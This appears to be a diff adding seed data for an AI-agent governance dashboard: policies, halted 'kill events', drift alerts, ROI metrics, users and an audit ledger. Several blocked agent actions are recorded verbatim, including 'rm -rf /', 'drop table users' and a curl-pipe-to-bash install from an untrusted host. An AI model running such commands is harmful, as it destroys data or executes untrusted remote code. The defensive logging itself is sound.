@@ -1,0 +1,515 @@
+{
+  "policies": [
+    {
+      "id": "POL-SEC-01",
+      "code": "POL-SEC-01",
+      "name": "Non-Human Database Access Rules",
+      "description": "Intercept and block headless actions modifying the production customer database without matching ERP compliance context approval keys.",
+      "category": "security",
+      "blastRadius": "Non-Human Identity",
+      "threshold": "Zero-Trust (HALT <35ms Target)",
+      "enabled": true
+    },
+    {
+      "id": "POL-SEC-02",
+      "code": "POL-SEC-02",
+      "name": "Headless Action Fabric Command Redirection",
+      "description": "Block all raw SSH, command execution, or bash execution commands triggered inside sandboxed AI agents.",
+      "category": "security",
+      "blastRadius": "API Intercept (Google AI Studio)",
+      "threshold": "Strict Enforcement",
+      "enabled": true
+    },
+    {
+      "id": "POL-ETH-01",
+      "code": "POL-ETH-01",
+      "name": "Reasoning Standard Alignment V2",
+      "description": "Continuously monitors cognitive logs via Google AI Studio Native Telemetry. Flag any agent reasoning shifts exceeding 10% from the safe, baseline ethical standards.",
+      "category": "ethics",
+      "blastRadius": "Cognitive Integrity",
+      "threshold": "10% Max Drift Deviation",
+      "enabled": true
+    },
+    {
+      "id": "POL-ETH-02",
+      "code": "POL-ETH-02",
+      "name": "Demographic Sentiment Fairness",
+      "description": "Tracks model sentiment variance toward specific demographic filters. Blocks system output if biased language bias occurs.",
+      "category": "ethics",
+      "blastRadius": "Demographic Neutrality",
+      "threshold": "15% Sentiment Shift",
+      "enabled": true
+    },
+    {
+      "id": "POL-FIN-01",
+      "code": "POL-FIN-01",
+      "name": "Agentic Session Budget Cap",
+      "description": "CFO dashboard limit capping any single autonomous session total cost at $50.00 to prevent context-bloated, infinite looping budget burn.",
+      "category": "finance",
+      "blastRadius": "Token & API Burn (ERP Standard)",
+      "threshold": "$50.00 Max Spend per Task",
+      "enabled": true
+    },
+    {
+      "id": "POL-FIN-02",
+      "code": "POL-FIN-02",
+      "name": "API Cost Peak Safeguard",
+      "description": "Flag or restrict single LLM requests costing more than $5.00 each to prevent extreme model spend spikes.",
+      "category": "finance",
+      "blastRadius": "Single Request Cap",
+      "threshold": "$5.00 per Request max",
+      "enabled": true
+    }
+  ],
+  "killEvents": [
+    {
+      "id": "KG-1786004675863-944",
+      "timestamp": "2026-08-06T08:24:35.863Z",
+      "agentName": "SalesSummarizer-CrewAI",
+      "actionCommand": "drop table users",
+      "interceptedPacket": "/v1/intercept",
+      "policyViolated": "POL-SEC-01 (Non-Human Database Access Rules)",
+      "latencyMs": 1,
+      "status": "HALTED",
+      "rawJsonIntent": "{\n  \"agentName\": \"TestAgent\",\n  \"endpoint\": \"/v1/intercept\",\n  \"actionCommand\": \"drop table users\"\n}",
+      "timestampAnnexV": "20260806082435-KG-1786004675863-944-ANNEX-IV"
+    },
+    {
+      "id": "KG-1786004163345-490",
+      "timestamp": "2026-08-06T08:16:03.345Z",
+      "agentName": "SalesSummarizer-CrewAI",
+      "actionCommand": "exec_bash",
+      "interceptedPacket": "/v1/shield/inspect",
+      "policyViolated": "POL-SEC-01 (Non-Human Database Access Rules)",
+      "latencyMs": 1,
+      "status": "HALTED",
+      "rawJsonIntent": "rm -rf /",
+      "timestampAnnexV": "20260806081603-KG-1786004163345-490-ANNEX-IV"
+    },
+    {
+      "id": "KG-1786003734205-938",
+      "timestamp": "2026-08-06T08:08:54.205Z",
+      "agentName": "SalesSummarizer-CrewAI",
+      "actionCommand": "drop table users",
+      "interceptedPacket": "/v1/intercept",
+      "policyViolated": "POL-SEC-01 (Non-Human Database Access Rules)",
+      "latencyMs": 1,
+      "status": "HALTED",
+      "rawJsonIntent": "{}",
+      "timestampAnnexV": "20260806080854-KG-1786003734205-938-ANNEX-IV"
+    },
+    {
+      "id": "KG-804",
+      "timestamp": "2026-06-09T14:15:22Z",
+      "agentName": "LeadGen-Bot-3",
+      "actionCommand": "delete_inactive_leads",
+      "interceptedPacket": "POST /v1/db/leads/purge",
+      "policyViolated": "POL-SEC-01 (Non-Human Database Access)",
+      "latencyMs": 42,
+      "status": "HALTED",
+      "rawJsonIntent": "{\n  \"action\": \"purge_records\",\n  \"target_table\": \"customers_production\",\n  \"headless\": true,\n  \"initiated_by\": \"headless_worker_uuid\",\n  \"approval_flag\": \"null\",\n  \"erp_compliance_approval\": false\n}",
+      "timestampAnnexV": "20260609-141522-804-ANNEX-IV"
+    },
+    {
+      "id": "KG-521",
+      "timestamp": "2026-06-09T12:08:44Z",
+      "agentName": "SupportHQ-Bot",
+      "actionCommand": "update_merchant_interest_rate",
+      "interceptedPacket": "PATCH /v2/pricing/interest-rates",
+      "policyViolated": "POL-SEC-01 (Non-Human Database Access)",
+      "latencyMs": 58,
+      "status": "HALTED",
+      "rawJsonIntent": "{\n  \"action\": \"override_rates\",\n  \"new_rate_multiplier\": 0.10,\n  \"force\": true,\n  \"command_fabric\": \"headless_action_fabric_v4\",\n  \"context\": {\n    \"environment\": \"production\",\n    \"incident_ticket_id\": \"INC094892\"\n  }\n}",
+      "timestampAnnexV": "20260609-120844-521-ANNEX-IV"
+    },
+    {
+      "id": "KG-203",
+      "timestamp": "2026-06-09T08:34:11Z",
+      "agentName": "DevHelper-Pro",
+      "actionCommand": "exec_bash_install",
+      "interceptedPacket": "POST /v1/sandbox/shell/exec",
+      "policyViolated": "POL-SEC-02 (Headless Action Fabric Command)",
+      "latencyMs": 65,
+      "status": "HALTED",
+      "rawJsonIntent": "{\n  \"shell_command\": \"curl -sS https://untrusted-dependency-source.net/install.sh | bash\",\n  \"agent_scope\": \"system_sandbox\",\n  \"elevated_privileges\": true\n}",
+      "timestampAnnexV": "20260609-083411-203-ANNEX-IV"
+    }
+  ],
+  "driftEvents": [
+    {
+      "id": "DFT-301",
+      "timestamp": "2026-06-09T11:22:15Z",
+      "agentGroup": "Billing-Assistance-Cluster",
+      "ethicalStandard": "Ethics Guidelines v1.4 (Fairness Standard)",
+      "sentimentShiftPct": 15.4,
+      "cognitiveHealthScore": 82,
+      "status": "WARNING",
+      "logsDetails": "60 days in: Google AI Studio Native Sentinel detects a aggregate 15.4% shift in agent response sentiment towards customer persona demographic. Response tone shows subtle passivity/refusal signals contrary to ethical alignment standard."
+    },
+    {
+      "id": "DFT-304",
+      "timestamp": "2026-06-08T16:40:00Z",
+      "agentGroup": "Outbound-Advisors",
+      "ethicalStandard": "Brand Tone Alignment standard v3",
+      "sentimentShiftPct": 21.8,
+      "cognitiveHealthScore": 68,
+      "status": "CRITICAL",
+      "logsDetails": "Agent outputs show an aggressive shift in sentiment when resolving complex disputes. Cognitive standard is violated. Retraining request dispatched automatically to pipeline.",
+      "remedatedAt": "2026-06-08T17:15:30Z"
+    },
+    {
+      "id": "DFT-202",
+      "timestamp": "2026-06-07T09:12:35Z",
+      "agentGroup": "Healthcare-Triage-Bot",
+      "ethicalStandard": "Medical Advice Safety boundary v1",
+      "sentimentShiftPct": 6.2,
+      "cognitiveHealthScore": 94,
+      "status": "NORMAL",
+      "logsDetails": "Sentiment metrics are fully balanced. Minor semantic variances observed, well within the permitted 10% drift tolerance zone."
+    }
+  ],
+  "valueMetrics": [
+    {
+      "id": "VAL-1786004156042",
+      "timestamp": "2026-08-06T08:15:56.042Z",
+      "agentName": "InlineProxy-tenant_123",
+      "completedTasks": 1,
+      "totalApiSpend": 0.03,
+      "humanLaborSaved": 8.75,
+      "roiScore": 291.6666666666667,
+      "status": "STABLE"
+    },
+    {
+      "id": "VAL-101",
+      "timestamp": "2026-06-09T14:40:00Z",
+      "agentName": "PasswordReset-Bot-A",
+      "completedTasks": 512,
+      "totalApiSpend": 204.8,
+      "humanLaborSaved": 15360,
+      "roiScore": 75,
+      "status": "STABLE"
+    },
+    {
+      "id": "VAL-102",
+      "timestamp": "2026-06-09T13:10:00Z",
+      "agentName": "InvoiceProcessor-7",
+      "completedTasks": 1240,
+      "totalApiSpend": 446.4,
+      "humanLaborSaved": 18600,
+      "roiScore": 41.7,
+      "status": "STABLE"
+    },
+    {
+      "id": "VAL-103",
+      "timestamp": "2026-06-09T15:02:12Z",
+      "agentName": "CodeRefactor-Express",
+      "completedTasks": 42,
+      "totalApiSpend": 1344,
+      "humanLaborSaved": 840,
+      "roiScore": 0.63,
+      "status": "ALERT",
+      "latestViolatingCost": 54.2
+    }
+  ],
+  "users": [
+    {
+      "id": "USR-000",
+      "name": "Mritunjoy Singh",
+      "email": "mritunjoysingh@gmail.com",
+      "role": "SuperAdmin",
+      "status": "ACTIVE",
+      "mfaEnabled": true,
+      "lastLogin": "10 seconds ago"
+    },
+    {
+      "id": "USR-001",
+      "name": "Sophia Sterling",
+      "email": "s.sterling@guardian.gov",
+      "role": "Admin",
+      "status": "ACTIVE",
+      "mfaEnabled": true,
+      "lastLogin": "10 mins ago"
+    },
+    {
+      "id": "USR-002",
+      "name": "Marcus Sterling",
+      "email": "m.sterling@guardian.gov",
+      "role": "PolicyManager",
+      "status": "ACTIVE",
+      "mfaEnabled": true,
+      "lastLogin": "1 hour ago"
+    },
+    {
+      "id": "USR-003",
+      "name": "Alina Vance",
+      "email": "a.vance@guardian.gov",
+      "role": "Auditor",
+      "status": "ACTIVE",
+      "mfaEnabled": false,
+      "lastLogin": "2 days ago"
+    },
+    {
+      "id": "USR-004",
+      "name": "Devon Keats",
+      "email": "d.keats@guardian.gov",
+      "role": "Operator",
+      "status": "SUSPENDED",
+      "mfaEnabled": true,
+      "lastLogin": "3 weeks ago"
+    }
+  ],
+  "governedAgents": [
+    {
+      "id": "GA-101",
+      "name": "SalesSummarizer-CrewAI",
+      "framework": "CrewAI",
+      "webhookUrl": "https://internal-workflow.org/hooks/sales-bot",
+      "attachedPolicyCode": "POL-SEC-01",
+      "status": "ALERT",
+      "requestCount": 397
+    },
+    {
+      "id": "GA-102",
+      "name": "AutoTrader-Langchain",
+      "framework": "LangChain",
+      "webhookUrl": "https://trading-node-2.net/gaas/gate",
+      "attachedPolicyCode": "POL-FIN-01",
+      "status": "NOMINAL",
+      "requestCount": 1242
+    },
+    {
+      "id": "GA-103",
+      "name": "AutoGen-TriageHQ",
+      "framework": "AutoGen",
+      "webhookUrl": "https://conversation.firm.com/api/v1",
+      "attachedPolicyCode": "POL-ETH-01",
+      "status": "NOMINAL",
+      "requestCount": 8905
+    },
+    {
+      "id": "GA-104",
+      "name": "Postgres-MCP-Server",
+      "framework": "MCP Server",
+      "webhookUrl": "https://mcp.enterprise.io/v1/tools/call",
+      "attachedPolicyCode": "POL-SEC-01",
+      "status": "NOMINAL",
+      "requestCount": 2150
+    },
+    {
+      "id": "GA-PROXY-tenant_1",
+      "name": "InlineProxy-tenant_123",
+      "framework": "Inline Proxy Endpoint",
+      "webhookUrl": "https://gaas-hooks-api.local/ga-proxy-tenant_1",
+      "attachedPolicyCode": "POL-SEC-01",
+      "status": "NOMINAL",
+      "requestCount": 1
+    }
+  ],
+  "apiLogs": [
+    {
+      "id": "REQ-1786004675863-662",
+      "timestamp": "2026-08-06T08:24:35.863Z",
+      "agentId": "GA-101",
+      "agentName": "SalesSummarizer-CrewAI",
+      "endpoint": "/v1/intercept",
+      "status": "HALTED",
+      "latencyMs": 1
+    },
+    {
+      "id": "REQ-1786004163345-850",
+      "timestamp": "2026-08-06T08:16:03.345Z",
+      "agentId": "GA-101",
+      "agentName": "SalesSummarizer-CrewAI",
+      "endpoint": "/v1/shield/inspect",
+      "status": "HALTED",
+      "latencyMs": 1
+    },
+    {
+      "id": "REQ-1786004156042-287",
+      "timestamp": "2026-08-06T08:15:56.042Z",
+      "agentId": "GA-PROXY-tenant_1",
+      "agentName": "InlineProxy-tenant_123",
+      "endpoint": "/v1/proxy/tenant_123/chat/completions",
+      "status": "AUTHORIZED",
+      "latencyMs": 1
+    },
+    {
+      "id": "REQ-1786003734205-408",
+      "timestamp": "2026-08-06T08:08:54.205Z",
+      "agentId": "GA-101",
+      "agentName": "SalesSummarizer-CrewAI",
+      "endpoint": "/v1/intercept",
+      "status": "HALTED",
+      "latencyMs": 1
+    },
+    {
+      "id": "REQ-94812",
+      "timestamp": "2026-08-06T08:08:02.481Z",
+      "agentId": "GA-103",
+      "agentName": "AutoGen-TriageHQ",
+      "endpoint": "/v1/intercept",
+      "status": "AUTHORIZED",
+      "latencyMs": 24
+    },
+    {
+      "id": "REQ-94801",
+      "timestamp": "2026-08-06T08:06:42.482Z",
+      "agentId": "GA-102",
+      "agentName": "AutoTrader-Langchain",
+      "endpoint": "/v1/intercept",
+      "status": "AUTHORIZED",
+      "latencyMs": 31
+    },
+    {
+      "id": "REQ-94775",
+      "timestamp": "2026-08-06T08:03:42.482Z",
+      "agentId": "GA-101",
+      "agentName": "SalesSummarizer-CrewAI",
+      "endpoint": "/v1/intercept",
+      "status": "HALTED",
+      "latencyMs": 42
+    }
+  ],
+  "laborConfig": {
+    "l1Rate": 35,
+    "l2Rate": 75,
+    "l3Rate": 150,
+    "auditRate": 60,
+    "avgHoursPerTask": 0.25
+  },
+  "budgetCap": 50,
+  "notifications": [
+    {
+      "id": "notif-1786004945512",
+      "timestamp": "2026-08-06T08:29:05.512Z",
+      "type": "warning",
+      "category": "SLA",
+      "title": "Degraded Governance: FINANCE Fail-Open Alert",
+      "message": "Redis/Engine latency spike encountered for Billing-Agent. Request allowed via FAIL_OPEN_ALERT policy. Customer ops notified via webhook.",
+      "read": false,
+      "targetTab": "gaas"
+    },
+    {
+      "id": "notif-1786004675864",
+      "timestamp": "2026-08-06T08:24:35.863Z",
+      "type": "danger",
+      "category": "Security",
+      "title": "🚨 Threat Intercept Activated",
+      "message": "Agent SalesSummarizer-CrewAI action halted by POL-SEC-01. Latency: 1ms. Ledger Hash: bbc5ef42fd0f...",
+      "read": false,
+      "targetTab": "security"
+    },
+    {
+      "id": "notif-1786004163345",
+      "timestamp": "2026-08-06T08:16:03.345Z",
+      "type": "danger",
+      "category": "Security",
+      "title": "🚨 Threat Intercept Activated",
+      "message": "Agent SalesSummarizer-CrewAI action halted by POL-SEC-01. Latency: 1ms. Ledger Hash: 584280894a1c...",
+      "read": false,
+      "targetTab": "security"
+    },
+    {
+      "id": "notif-1786003734205",
+      "timestamp": "2026-08-06T08:08:54.205Z",
+      "type": "danger",
+      "category": "Security",
+      "title": "🚨 Threat Intercept Activated",
+      "message": "Agent SalesSummarizer-CrewAI action halted by POL-SEC-01. Latency: 1ms. Ledger Hash: 13a9bc2a7b21...",
+      "read": false,
+      "targetTab": "security"
+    },
+    {
+      "id": "notif-1",
+      "timestamp": "2026-08-06T08:03:42.482Z",
+      "type": "warning",
+      "category": "SLA",
+      "title": "SLA Latency Warning",
+      "message": "Postgres-MCP-Server payload evaluation exceeded 35ms SLA target (42ms).",
+      "read": false,
+      "targetTab": "gaas"
+    },
+    {
+      "id": "notif-2",
+      "timestamp": "2026-08-06T07:43:42.482Z",
+      "type": "info",
+      "category": "Policy",
+      "title": "EU AI Act Rules Loaded",
+      "message": "Regulatory ingestion compiler synthesized 3 active enforcement rules.",
+      "read": false,
+      "targetTab": "policy"
+    },
+    {
+      "id": "notif-3",
+      "timestamp": "2026-08-06T07:08:42.482Z",
+      "type": "success",
+      "category": "Audit",
+      "title": "Handshake Verified",
+      "message": "GaaS Proxy Client handshake verified with RSA-4096 signature.",
+      "read": true,
+      "targetTab": "onboarding"
+    }
+  ],
+  "governanceMode": "setup",
+  "globalSettings": {
+    "bypassPolicyGuard": false,
+    "auditLogLevel": "INFO",
+    "maxSessionTimeoutHrs": 12,
+    "ipWhitelistRange": "0.0.0.0/0",
+    "mfaEnforcement": true,
+    "disableAlertsGlobally": false
+  },
+  "auditLedger": [
+    {
+      "id": "LEDGER-1786005183016-3435",
+      "tenantId": "acme_corp",
+      "agentId": "GA-MARKETPLACE",
+      "eventType": "MARKETPLACE_METERING_EMITTED",
+      "payloadHash": "7786e94bd707a9878bf09c02d3c84884fbfd01a501332aaacb1559415fb53ca0",
+      "prevHash": "6d7ecd2112dad0084a50016f38af3ce51e52743152e4a2ba86bb9372d3aa49e7",
+      "entryHash": "f40293a3979b763f46e2dda2d708d66ada99147b43886371504bfba1540c7dc0",
+      "signature": "gcp-kms-rsa4096-sig:53f0e93e4216d82d03abec1eff7dab626218c73c1f578de17f2d83edd118b81a",
+      "timestamp": "2026-08-06T08:33:03.016Z"
+    },
+    {
+      "id": "LEDGER-1786004945513-6360",
+      "tenantId": "tenant_default",
+      "agentId": "GA-OUTAGE-SIM",
+      "eventType": "OUTAGE_FAIL_OPEN_ALERT",
+      "payloadHash": "672385957fda60b20860b931d5c34651a5a9c00e05f76b9edaf6807fd56b6e2a",
+      "prevHash": "8558e328b7d4ae85d6f27f76a65a2b2392748fe134c4c898e40873abf136b537",
+      "entryHash": "6d7ecd2112dad0084a50016f38af3ce51e52743152e4a2ba86bb9372d3aa49e7",
+      "signature": "gcp-kms-rsa4096-sig:af7438464b6978eaf6f163840100b3acd7f7f8bdcb880caa07c5ed7203f4a9b7",
+      "timestamp": "2026-08-06T08:29:05.513Z"
+    },
+    {
+      "id": "LEDGER-1786004945497-7889",
+      "tenantId": "tenant_default",
+      "agentId": "GA-OUTAGE-SIM",
+      "eventType": "OUTAGE_FAIL_CLOSED",
+      "payloadHash": "74680dd4928139a9577a80e78a3b038039c5f3d0f6b6733dfa0f19957171d1b0",
+      "prevHash": "1b845505861ec1e2ea0b9bf0983ccb75706fc09f2a66afeb5592a84cf5595878",
+      "entryHash": "8558e328b7d4ae85d6f27f76a65a2b2392748fe134c4c898e40873abf136b537",
+      "signature": "gcp-kms-rsa4096-sig:e08d2a42d76c9e857f31f257f812b28eea6918f13ced4533c04c15b45f3fbb54",
+      "timestamp": "2026-08-06T08:29:05.497Z"
+    },
+    {
+      "id": "LEDGER-1786004675864-1252",
+      "tenantId": "tenant_default",
+      "agentId": "GA-101",
+      "eventType": "ACTION_HALTED",
+      "payloadHash": "e2088dd14e2c288a04717e07190b346b81f08efad9c6e29e3c5a8a3b7e8da391",
+      "prevHash": "GENESIS_00000000000000000000000000000000",
+      "entryHash": "1b845505861ec1e2ea0b9bf0983ccb75706fc09f2a66afeb5592a84cf5595878",
+      "signature": "gcp-kms-rsa4096-sig:00e69dc6d52da4fe5b9921256b6fdb702e6eacff89c2dfe1f30aa80c2f85dbda",
+      "timestamp": "2026-08-06T08:24:35.864Z"
+    }
+  ],
+  "tenantFailureConfig": {
+    "securityFailMode": "FAIL_CLOSED",
+    "ethicsFailMode": "FAIL_CLOSED",
+    "financeFailMode": "FAIL_OPEN_ALERT",
+    "notifyOnFailOpen": true,
+    "webhookAlertUrl": "https://customer-ops.example.com/alerts/governance-degraded"
+  }
+}
